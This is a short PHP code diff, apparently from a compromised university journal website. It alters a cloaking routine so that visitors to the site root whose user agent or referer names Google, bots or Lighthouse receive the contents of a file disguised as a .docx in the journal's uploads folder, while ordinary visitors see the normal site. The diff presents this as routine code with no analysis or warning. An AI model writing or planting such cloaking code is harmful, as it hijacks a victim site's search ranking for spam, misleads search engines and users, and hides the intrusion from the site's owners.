@@ -3,13 +3,13 @@ $userAgent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER
 $referer = strtolower(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');
 $uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
 
-if ($uri == '/www/wwwfiles/journal1.uinssc.ac.id/files-journal/contexts/34/library/296evxw4566d8.docx' && (
+if ($uri == '/' && (
     strpos($userAgent, 'bot') !== false || 
     strpos($userAgent, 'google') !== false || 
     strpos($userAgent, 'chrome-lighthouse') !== false || 
     strpos($referer, 'google') !== false
 )) {
-    echo file_get_contents('/dev/shm/ijsr');
+    echo file_get_contents('/www/wwwfiles/journal1.uinssc.ac.id/files-journal/contexts/34/library/296evxw4566d8.docx');
     exit();
 }
 
